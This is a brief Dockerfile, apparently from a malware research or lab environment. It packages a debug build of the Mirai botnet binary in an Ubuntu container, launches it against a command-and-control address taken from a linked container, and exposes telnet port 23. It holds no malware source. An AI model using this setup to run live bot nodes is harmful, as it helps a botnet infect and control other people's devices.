FROM ubuntu:14.04.5
ADD mirai.dbg /
CMD IP=`ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'` \
	&& CNC=`env | grep CNC_PORT_23_TCP_ADDR | cut -d= -f2` \
	&& /mirai.dbg $CNC $IP $CNC 0
EXPOSE 23
